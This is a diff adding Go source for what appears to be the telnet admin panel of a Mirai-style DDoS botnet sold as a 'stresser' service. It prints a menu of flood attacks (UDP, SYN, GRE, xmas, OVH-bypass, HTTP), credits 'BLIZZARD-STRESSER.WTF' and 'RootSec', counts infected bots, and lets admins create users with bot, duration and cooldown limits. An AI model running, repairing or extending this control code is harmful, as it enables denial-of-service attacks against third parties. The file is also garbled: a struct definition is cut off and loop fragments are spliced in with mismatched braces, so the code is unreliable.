@@ -1,0 +1,118 @@
+
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "os"
+    "strings"
+    "strconv"
+    "time"
+)
+
+
+type Admin struct {
+    reader *bufio.Reader
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m std [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m] len=[\033[01;37m1400\033[01;37m]\033[01;31m║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m           ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m xmas [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m               ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m ovh [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m asyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m    		║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m usyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m		║   \033[0m \r\n"))	
+                this.conn.Write([]byte("\033[01;31m ║ \033[01;37m http [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] domain=[\033[01;37mDOMAIN\033[01;37m] conns=5000\033[01;31m ║   \033[0m \r\n"))
+                this.conn.Write([]byte("\033[01;31m ╚-════════════════════════════════════════════-╝   \033[0m \r\n"))
+                continue
+            }
+        
+            if userInfo.admin == 1 && cmd == "admin" {
+                this.conn.Write([]byte("\033[01;37m ╔-═════════════════════════════════-╗\r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;31madduser -> \033[01;37mAdd normal user  \033[01;37m║\r\n"))
+                this.conn.Write([]byte("\033[01;37m ╚-═════════════════════════════════-╝  \r\n"))
+                continue
+            }
+            if cmd == "credits" || cmd == "CREDITS" {
+                this.conn.Write([]byte("\033[01;37m ╔-═════════════════════════════════-╗\r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;31mOwner: \033[01;37mBLIZZARD-STRESSER.WTF	      \033[01;37m║\r\n"))
+                this.conn.Write([]byte("\033[01;37m ║ \033[01;31mDeveloper: \033[01;37mRootSec	      \033[01;37m║\r\n"))
+                this.conn.Write([]byte("\033[01;37m ╚-═════════════════════════════════-╝  \r\n"))
+                continue
+            }
+        
+            if cmd == "bots" || cmd == "BOTS" {
+            botCount = clientList.Count()
+                m := clientList.Distribution()
+                for k, v := range m {
+                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
+                }
+                this.conn.Write([]byte(fmt.Sprintf("\033[01;37mTotal bots: \033[01;31m[\033[01;31m%d\033[01;31m]\r\n\033[0m", botCount)))
+                continue
+            }
+            
+        botCount = userInfo.maxBots
+
+        if userInfo.admin == 1 && cmd == "adduser" {
+            this.conn.Write([]byte("Enter new username: "))
+            new_un, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            this.conn.Write([]byte("Enter new password: "))
+            new_pw, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
+            max_bots_str, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            max_bots, err := strconv.Atoi(max_bots_str)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
+                continue
+            }
+            this.conn.Write([]byte("Max attack duration (-1 for none): "))
+            duration_str, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            duration, err := strconv.Atoi(duration_str)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
+                continue
+            }
+            this.conn.Write([]byte("Cooldown time (0 for none): "))
+            cooldown_str, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            cooldown, err := strconv.Atoi(cooldown_str)
+            if err != nil {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
+                continue
+            }
+            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
+            confirm, err := this.ReadLine(false)
+            if err != nil {
+                return
+            }
+            if confirm != "y" {
+                continue
+            }
+            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
+                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
+            } else {
+                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
+            }
+            continue
+        }
+        if cmd[0] == '*' {
+            countSplit := strings.SplitN(cmd, " ", 2)
+            count := countSplit[0][1:]
+            botCount, err = strconv.Atoi(count)
+    reader *bufio.Reader
+    writer *os.File
+}
+            }
